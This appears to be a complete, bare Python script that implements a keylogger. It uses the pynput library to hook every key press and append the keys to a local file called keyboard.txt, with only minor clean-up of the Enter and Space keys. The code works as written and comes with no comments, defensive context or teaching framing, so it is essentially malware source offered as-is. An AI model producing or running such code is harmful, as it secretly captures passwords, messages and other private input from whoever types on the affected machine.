from pynput.keyboard import Listener

def write_keylogger(key):
    key1 = str(key).replace("'", "")
    with open("keyboard.txt", "a") as f:
        if key1 == "Key.enter":
            key1 = " "
        if key1 == "Key.space":
            key1 = " "
        f.write(key1)

with Listener(on_press=write_keylogger) as l:
    l.join()

